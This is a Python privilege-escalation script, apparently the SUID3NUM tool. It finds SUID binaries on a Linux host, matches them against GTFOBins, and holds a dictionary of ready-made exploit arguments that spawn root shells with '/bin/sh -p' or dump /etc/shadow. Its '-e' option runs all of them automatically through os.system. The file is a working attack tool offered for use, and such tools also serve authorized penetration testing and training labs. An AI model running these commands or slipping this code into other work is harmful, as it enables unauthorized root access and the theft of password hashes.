#!/usr/bin/python3

"""
Works with both python2 & python3
"""

from sys import argv
from os import system, popen
from time import sleep

"""
The following list contains all default SUID bins found within Unix
"""

defSUIDBinaries = ["arping", "at", "bwrap", "chfn", "chrome-sandbox", "chsh", "dbus-daemon-launch-helper", "dmcrypt-get-device", "exim4", "fusermount", "gpasswd", "helper", "kismet_capture", "lxc-user-nic", "mount", "mount.cifs", "mount.ecryptfs_private", "mount.nfs", "newgidmap", "newgrp", "newuidmap", "ntfs-3g", "passwd", "ping", "ping6", "pkexec", "polkit-agent-helper-1", "pppd", "snap-confine", "ssh-keysign", "su", "sudo", "traceroute6.iputils", "ubuntu-core-launcher", "umount", "VBoxHeadless", "VBoxNetAdpCtl", "VBoxNetDHCP", "VBoxNetNAT", "VBoxSDL", "VBoxVolInfo", "VirtualBoxVM", "vmware-authd", "vmware-user-suid-wrapper", "vmware-vmx", "vmware-vmx-debug", "vmware-vmx-stats", "Xorg.wrap"]

"""
Auto Exploitation of SUID Bins - List
"""

suidExploitation = {
	'taskset': '1 /bin/sh -p',
	'gdb': '-q -nx -ex \'python import os; os.execl("/bin/sh", "sh", "-p")\' -ex quit',
	'bash': '-p',
	'busybox': 'sh',
	'cat': '/etc/shadow',
	'cut': '-d "" -f1 /etc/shadow',
	'dash': '-p',
	'docker': 'run -v /:/mnt --rm -it alpine chroot /mnt sh',
	'env': '/bin/sh -p',
	'expand': '/etc/shadow',
	'expect': '-c "spawn /bin/sh -p;interact"',
	'flock': '-u / /bin/sh -p',
	'fold': '-w99999999 /etc/shadow',
	'grep': '"" /etc/shadow',
	'head': '-c2G /etc/shadow',
	'ionice': '/bin/sh -p',
	'jrunscript': '-e "exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)\')"',
	'ksh': '-p',
	'ld.so': '/bin/sh -p',
	'less': '/etc/shadow',
	'logsave': '/dev/null /bin/sh -i -p',
	'make': '-s --eval=$\'x:\\n\\t-\'"/bin/sh -p"',
	'more': '/etc/shadow',
	'nice': '/bin/sh -p',
	'nl': '-bn -w1 -s '' /etc/shadow',
	'node': 'node -e \'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]});\'',
	'od': 'od -An -c -w9999 /etc/shadow | sed -E -e \'s/ //g\' -e \'s/\\\\n/\\n/g\'',
	'perl': '-e \'exec "/bin/sh";\'',
	'pg': '/etc/shadow',
	'php': '-r "pcntl_exec(\'/bin/sh\', [\'-p\']);"',
	'python': '-c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
	'rlwrap': '-H /dev/null /bin/sh -p',
	'rpm': '--eval \'%{lua:os.execute("/bin/sh", "-p")}\'',
	'rpmquery': '--eval \'%{lua:posix.exec("/bin/sh", "-p")}\'',
	'rsync': '-e \'sh -p -c "sh 0<&2 1>&2"\' 127.0.0.1:/dev/null',
	'run-parts': '--new-session --regex \'^sh$\' /bin --arg=\'-p\'',
	'rvim': '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
	'sed': '-e "" /etc/shadow',
	'setarch': '$(arch) /bin/sh -p',
	'sort': '-m /etc/shadow',
	'start-stop-daemon': '-n $RANDOM -S -x /bin/sh -- -p',
	'stdbuf': '-i0 /bin/sh -p',
	'strace': '-o /dev/null /bin/sh -p',
	'tail': '-c2G /etc/shadow',
	'time': '/bin/sh -p',
	'timeout': '7d /bin/sh -p',
	'ul': '/etc/shadow',
	'unexpand': 'unexpand -t99999999 /etc/shadow',
	'uniq': '/etc/shadow',
	'unshare': '-r /bin/sh',
	'vim': '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
	'watch': '-x sh -c \'reset; exec sh 1>&0 2>&0\'',
	'xargs': '-a /dev/null sh -p',
	'xxd': '/etc/shadow | xxd -r'
}

"""
The following list contains GTFO Bins binaries which are SUID exploitable
"""

gtfoBinsList	= ["aria2c", "arp", "ash", "awk", "base64", "bash", "busybox", "cat", "chmod", "chown", "cp", "csh", "curl", "cut", "dash", "date", "dd", "diff", "dmsetup", "docker", "ed", "emacs", "env", "expand", "expect", "file", "find", "flock", "fmt", "fold", "ftp", "gawk", "gdb", "gimp", "git", "grep", "head", "iftop", "ionice", "ip", "irb", "jjs", "jq", "jrunscript", "ksh", "ld.so", "ldconfig", "less", "logsave", "lua", "make", "man", "mawk", "more", "mv", "mysql", "nano", "nawk", "nc", "netcat", "nice", "nl", "nmap", "node", "od", "openssl", "perl", "pg", "php", "pic", "pico", "python", "readelf", "rlwrap", "rpm", "rpmquery", "rsync", "ruby", "run-parts", "rvim", "scp", "script", "sed", "setarch", "sftp", "sh", "shuf", "socat", "sort", "sqlite3", "ssh", "start-stop-daemon", "stdbuf", "strace", "systemctl", "tail", "tar", "taskset", "tclsh", "tee", "telnet", "tftp", "time", "timeout", "ul", "unexpand", "uniq", "unshare", "vi", "vim", "watch", "wget", "wish", "xargs", "xxd", "zip", "zsh"]

"""
Colors List
"""

cyan 	= "\033[0;96m"
green 	= "\033[0;92m"
white 	= "\033[0;97m"
red 	= "\033[0;91m"
blue 	= "\033[0;94m"
yellow 	= "\033[0;33m"
magenta = "\033[0;35m"

barLine = "------------------------------"

banner 	= magenta + "  ___ _   _ _ ___    _____  _ _   _ __  __ \n"
banner += yellow + " / __| | | / |   \\  |__ / \\| | | | |  \\/  |\n"
banner += blue + " \\__ \\ |_| | | |) |  |_ \\ .` | |_| | |\\/| |\n"
banner += red + " |___/\\___/|_|___/  |___/_|\\_|\\___/|_|  |_| " + cyan + " github@Anon-Exploiter\n"


def listAllSUIDBinaries():
	"""
	Listing all SUID Binaries found in the system
	"""

	print(white + "[" + blue + "#" + white + "] " + yellow + "Finding/Listing all SUID Binaries ..")
	print(white + barLine)
	
	command 	= "find / -perm /4000 2>/dev/null"
	result 		= popen(command).read().strip().split("\n")
	
	for bins in result:
		print(yellow + bins)
	
	print(white + barLine + "\n\n")
	return(result)

def doSomethingPlis(listOfSuidBins):
	"""
	This function prints the following data:
		- Default binaries which ship with installation of linux
		- Custom binaries which aren't part of default list
		- Binaries which match GTFObins list!
	"""

	_bins 			= []
	binsInGTFO 		= []
	customSuidBins 	= []
	defaultSuidBins = []

	for bins in listOfSuidBins:
		_binName 	= bins.split("/")[::-1][0]

		if _binName not in defSUIDBinaries:
			customSuidBins.append(bins)

			if _binName in gtfoBinsList:
				binsInGTFO.append(bins)

		else:
			defaultSuidBins.append(bins)

	print(white + "["+ red + "!" + white + "] Default Binaries (Don't bother)")
	print(barLine)
	for bins in defaultSuidBins: print(blue + bins)
	print(white + barLine + "\n\n")

	print(white + "[" + cyan + "~" + white + "] " + cyan + "Custom SUID Binaries (Interesting Stuff)")
	print(white + barLine)
	for bins in customSuidBins: print(cyan + bins)
	print(white + barLine + "\n\n")

	"""
	QWgsIEkgc2VlIHlvdSdyZSBhIG1hbiBvZiBjdWx0dXJlIGFzIHdlbGwgOkQgCk5vdCBldmVyeW9uZSByZWFkcyBzb3VyY2UgY29kZSBvZiB3aGF0IHRoZXkncmUgcnVubmluZyBub3ctYS1kYXlzIMKvXF8o44OEKV8vwq8K
	"""

	if len(binsInGTFO) != 0:
		print("[" + green + "#" + white + "] " + green + "SUID Binaries in GTFO bins list (Hell Yeah!)")
		print(white + barLine)

		for bin in binsInGTFO:
			pathOfBin 	= popen("which " + bin).read().strip() 
			gtfoUrl 	= "https://gtfobins.github.io/gtfobins/" + bin[::-1].split("/")[0][::-1] + "/#suid"
			print(green + pathOfBin + white + " -~> " + magenta + gtfoUrl)
		
		print(white + barLine + "\n\n")

	else:
		print("[" + green + "#" + white + "] " + green + "SUID Binaries found in GTFO bins..")
		print(white + barLine)
		print("[" + red + "!" + white + "] " + magenta + "None " + red + ":(")
		print(white + barLine + "\n\n")

	return(binsInGTFO, defaultSuidBins, customSuidBins)


def note():
	print(white + "[" + red + "-" + white + "] " + magenta + "Note")
	print(white + barLine)
	print(blue  + "If you see any FP in the output, please report it to make the script better! :)")	
	print(white + barLine + "\n")

def exploitThisShit(bins):
	commands 	= []

	for suidBins in bins:
		_bin 	= suidBins.split("/")[::-1][0]
		
		if _bin in suidExploitation:
			_results 	= suidBins + " " + suidExploitation[_bin]
			commands.append(_results)

	if len(argv) == 2:
		if argv[1] == '-e':
			print(white + "[" + magenta + "$" + white + "] " + white + "Auto Exploiting SUID bit binaries !!!")
			print(white + barLine)

			for _commands in commands:
				print(magenta + "\n[#] Executing Command .. ")
				print(cyan + "[~] " + _commands + "\n" + white)
				sleep(0.5)
				system(_commands)
				sleep(0.5)

			print(white + barLine + "\n\n")

	else:
		print(white + "[" + green + "$" + white + "] " + white + "Please try the command(s) below to exploit SUID bin(s) found !!!")
		print(white + barLine)

		for _commands in commands:
			print("[~] " + _commands)

		print(white + barLine + "\n\n")	

def main():
	print(banner)
	try:
		suidBins 	= listAllSUIDBinaries()
		gtfoBins 	= doSomethingPlis(suidBins)
		exploitThisShit(gtfoBins[0]); note()

	except KeyboardInterrupt:
		print("\n[" + red + "!" + white + "] " + red + "Aye, why you do dis!?")

if __name__ == '__main__':
	main()